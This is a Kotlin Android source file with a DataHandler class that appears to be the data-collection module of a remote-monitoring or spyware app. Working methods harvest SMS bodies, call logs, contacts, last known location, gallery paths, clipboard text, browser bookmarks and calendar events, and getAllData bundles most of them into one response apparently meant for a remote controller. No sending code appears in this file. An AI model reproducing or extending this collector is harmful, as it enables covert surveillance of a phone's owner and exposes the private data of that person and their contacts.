package com.abuzahra.app.handler

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.CalendarContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import com.abuzahra.app.utils.DeviceInfo
import java.io.File

class DataHandler(private val context: Context) {
    private val TAG = "DataHandler"

    @SuppressLint("Range")
    fun getSMS(): Any {
        val smsList = mutableListOf<Map<String, Any>>()
        try {
            val uri = Telephony.Sms.CONTENT_URI
            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ
            )
            val cursor = context.contentResolver.query(uri, projection, null, null, Telephony.Sms.DATE + " DESC LIMIT 50")

            cursor?.use {
                while (it.moveToNext()) {
                    smsList.add(mapOf(
                        "id" to it.getLong(it.getColumnIndex(Telephony.Sms._ID)),
                        "address" to (it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS)) ?: ""),
                        "body" to (it.getString(it.getColumnIndex(Telephony.Sms.BODY)) ?: ""),
                        "date" to (it.getLong(it.getColumnIndex(Telephony.Sms.DATE))),
                        "type" to when (it.getInt(it.getColumnIndex(Telephony.Sms.TYPE))) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                            else -> "other"
                        },
                        "read" to (it.getInt(it.getColumnIndex(Telephony.Sms.READ)) == 1)
                    ))
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading SMS", e)
            return mapOf("status" to "error", "message" to e.message, "count" to smsList.size, "data" to smsList)
        }
        return mapOf("status" to "success", "count" to smsList.size, "data" to smsList)
    }

    @SuppressLint("Range")
    fun getCalls(): Any {
        val callList = mutableListOf<Map<String, Any>>()
        try {
            val uri = CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE,
                CallLog.Calls.CACHED_NAME
            )
            val cursor = context.contentResolver.query(uri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 50")

            cursor?.use {
                while (it.moveToNext()) {
                    callList.add(mapOf(
                        "id" to it.getLong(it.getColumnIndex(CallLog.Calls._ID)),
                        "number" to (it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: ""),
                        "name" to (it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME)) ?: ""),
                        "date" to (it.getLong(it.getColumnIndex(CallLog.Calls.DATE))),
                        "duration" to (it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))),
                        "type" to when (it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))) {
                            CallLog.Calls.INCOMING_TYPE -> "incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                            CallLog.Calls.MISSED_TYPE -> "missed"
                            else -> "other"
                        }
                    ))
                }
            }
        } catch (e: Exception) {
            return mapOf("status" to "error", "message" to e.message, "count" to callList.size, "data" to callList)
        }
        return mapOf("status" to "success", "count" to callList.size, "data" to callList)
    }

    @SuppressLint("Range")
    fun getContacts(): Any {
        val contacts = mutableListOf<Map<String, Any>>()
        try {
            val uri = ContactsContract.Contacts.CONTENT_URI
            val cursor = context.contentResolver.query(uri, null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 100")

            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(it.getColumnIndex(ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) ?: ""

                    val phoneNumbers = mutableListOf<String>()
                    val phoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                    val phoneCursor = context.contentResolver.query(phoneUri, null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", arrayOf(id), null)
                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            phoneNumbers.add(pc.getString(pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                        }
                    }

                    contacts.add(mapOf("id" to id, "name" to name, "phones" to phoneNumbers))
                }
            }
        } catch (e: Exception) {
            return mapOf("status" to "error", "message" to e.message, "count" to contacts.size, "data" to contacts)
        }
        return mapOf("status" to "success", "count" to contacts.size, "data" to contacts)
    }

    fun getLocation(): Any {
        return try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val location = locationManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                ?: locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)

            if (location != null) {
                mapOf("status" to "success",
                    "latitude" to location.latitude,
                    "longitude" to location.longitude,
                    "accuracy" to location.accuracy,
                    "altitude" to location.altitude,
                    "speed" to location.speed,
                    "provider" to location.provider,
                    "timestamp" to location.time)
            } else {
                mapOf("status" to "no_fix", "message" to "No last known location. Try again with GPS enabled.")
            }
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to e.message)
        }
    }

    fun getNotifications(): Any {
        return mapOf("status" to "requires_service", "message" to "Notification access requires NotificationListenerService")
    }

    fun getInstalledApps(): Any {
        return try {
            val pm = context.packageManager
            val packages = pm.getInstalledPackages(0)
            val apps = packages.map { pkg ->
                mapOf(
                    "packageName" to pkg.packageName,
                    "appName" to (pkg.applicationInfo?.loadLabel(pm)?.toString() ?: pkg.packageName),
                    "version" to pkg.versionName,
                    "isSystem" to ((pkg.applicationInfo?.flags ?: 0) and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0)
                )
            }.sortedBy { it["appName"] as String }
            mapOf("status" to "success", "count" to apps.size, "data" to apps)
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to e.message)
        }
    }

    fun getRunningApps(): Any {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val processes = am.runningAppProcesses ?: emptyList()
            val apps = processes.map { proc ->
                mapOf(
                    "processName" to proc.processName,
                    "pid" to proc.pid,
                    "importance" to proc.importance
                )
            }
            mapOf("status" to "success", "count" to apps.size, "data" to apps)
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to e.message)
        }
    }

    fun getDeviceInfo(): Any {
        return mapOf("status" to "success") + DeviceInfo.getFullDeviceInfo(context)
    }

    fun getBatteryInfo(): Any {
        return try {
            val filter = android.content.Intent.ACTION_BATTERY_CHANGED
            val batteryStatus = context.registerReceiver(null, android.content.IntentFilter(filter))
            val level = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0
            val scale = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
            val status = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, 0) ?: 0
            val plugged = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, 0) ?: 0
            val temperature = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
            val voltage = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
            val health = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, 0) ?: 0

            mapOf("status" to "success",
                "level" to (level * 100 / scale),
                "charging" to (status == android.os.BatteryManager.BATTERY_STATUS_CHARGING),
                "plugged" to plugged,
                "temperature" to (temperature / 10.0),
                "voltage" to voltage,
                "health" to health,
                "technology" to (batteryStatus?.getStringExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY) ?: "Unknown"))
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to e.message)
        }
    }

    fun getGallery(): Any {
        return try {
            val images = mutableListOf<Map<String, Any>>()
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATA
            )
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val cursor = context.contentResolver.query(uri, projection, null, null, MediaStore.Images.Media.DATE_TAKEN + " DESC LIMIT 30")
            cursor?.use {
                while (it.moveToNext()) {
                    images.add(mapOf(
                        "name" to (it.getString(1) ?: ""),
                        "date" to (it.getLong(2)),
                        "size" to (it.getLong(3)),
                        "path" to (it.getString(4) ?: "")
                    ))
                }
            }
            mapOf("status" to "success", "count" to images.size, "data" to images)
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to e.message)
        }
    }

    fun getClipboard(): Any {
        return try {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = clipboard.primaryClip
            if (clip != null && clip.itemCount > 0) {
                mapOf("status" to "success", "text" to (clip.getItemAt(0)?.coerceToText(context) ?: ""))
            } else {
                mapOf("status" to "empty", "message" to "Clipboard is empty")
            }
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to e.message)
        }
    }

    fun getAllData(): Any {
        return mapOf(
            "status" to "success",
            "sms" to getSMS(),
            "calls" to getCalls(),
            "contacts" to getContacts(),
            "location" to getLocation(),
            "info" to getDeviceInfo(),
            "battery" to getBatteryInfo(),
            "apps" to getInstalledApps(),
            "wifi" to getWifiInfo(),
            "network" to getNetworkInfo(),
            "sim" to getSIMInfo(),
            "storage" to getStorageInfo()
        )
    }

    fun getWifiInfo(): Any {
        return try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            val info = wm.connectionInfo
            mapOf("status" to "success",
                "ssid" to (info?.ssid?.replace("\"", "") ?: "Not connected"),
                "bssid" to (info?.bssid ?: "Unknown"),
                "ip" to (info?.ipAddress?.let {
                    String.format("%d.%d.%d.%d", it and 0xff, it shr 8 and 0xff, it shr 16 and 0xff, it shr 24 and 0xff)
                } ?: "0.0.0.0"),
                "rssi" to (info?.rssi ?: 0),
                "networkId" to (info?.networkId ?: -1))
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to e.message)
        }
    }

    fun getNetworkInfo(): Any {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = cm.activeNetworkInfo
            if (network != null) {
                mapOf("status" to "success",
                    "type" to network.typeName,
                    "subtype" to network.subtypeName,
                    "connected" to network.isConnected,
                    "available" to network.isAvailable)
            } else {
                mapOf("status" to "disconnected", "message" to "No active network")
            }
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to e.message)
        }
    }

    fun getSIMInfo(): Any {
        return mapOf("status" to "success", "data" to DeviceInfo.getSIMInfo(context))
    }

    fun getStorageInfo(): Any {
        return try {
            val internalPath = Environment.getDataDirectory()
            val internalStat = StatFs(internalPath.path)
            val internalTotal = internalStat.totalBytes
            val internalFree = internalStat.freeBytes

            val externalPath = Environment.getExternalStorageDirectory()
            val externalStat = StatFs(externalPath.path)
            val externalTotal = externalStat.totalBytes
            val externalFree = externalStat.freeBytes

            mapOf("status" to "success",
                "internal" to mapOf(
                    "total" to formatFileSize(internalTotal),
                    "free" to formatFileSize(internalFree),
                    "used" to formatFileSize(internalTotal - internalFree),
                    "totalBytes" to internalTotal,
                    "freeBytes" to internalFree
                ),
                "external" to mapOf(
                    "total" to formatFileSize(externalTotal),
                    "free" to formatFileSize(externalFree),
                    "used" to formatFileSize(externalTotal - externalFree),
                    "totalBytes" to externalTotal,
                    "freeBytes" to externalFree
                ))
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to e.message)
        }
    }

    fun getBrowserHistory(): Any {
        val history = mutableListOf<Map<String, Any>>()
        try {
            val chromeUri = android.net.Uri.parse("content://com.android.chrome.browser/bookmarks")
            val cursor = context.contentResolver.query(chromeUri, null, null, null, null)
            cursor?.use {
                val titleIdx = it.getColumnIndex("title")
                val urlIdx = it.getColumnIndex("url")
                while (it.moveToNext()) {
                    history.add(mapOf(
                        "title" to (if (titleIdx >= 0) it.getString(titleIdx) ?: "" else ""),
                        "url" to (if (urlIdx >= 0) it.getString(urlIdx) ?: "" else ""),
                        "date" to System.currentTimeMillis()
                    ))
                }
            }
        } catch (_: Exception) {}
        return mapOf("status" to "success", "count" to history.size, "data" to history)
    }

    @SuppressLint("Range")
    fun getCalendar(): Any {
        val events = mutableListOf<Map<String, Any>>()
        try {
            val projection = arrayOf(
                CalendarContract.Events._ID,
                CalendarContract.Events.TITLE,
                CalendarContract.Events.DESCRIPTION,
                CalendarContract.Events.DTSTART,
                CalendarContract.Events.DTEND,
                CalendarContract.Events.EVENT_LOCATION
            )
            val cursor = context.contentResolver.query(CalendarContract.Events.CONTENT_URI, projection, null, null, CalendarContract.Events.DTSTART + " ASC LIMIT 30")
            cursor?.use {
                while (it.moveToNext()) {
                    events.add(mapOf(
                        "id" to it.getLong(0),
                        "title" to (it.getString(1) ?: ""),
                        "description" to (it.getString(2) ?: ""),
                        "startTime" to (it.getLong(3)),
                        "endTime" to (it.getLong(4)),
                        "location" to (it.getString(5) ?: "")
                    ))
                }
            }
        } catch (e: Exception) {
            return mapOf("status" to "error", "message" to e.message, "count" to events.size, "data" to events)
        }
        return mapOf("status" to "success", "count" to events.size, "data" to events)
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            bytes < 1024 * 1024 * 1024 -> "${bytes / (1024 * 1024)} MB"
            else -> "${bytes / (1024 * 1024 * 1024)} GB"
        }
    }
}
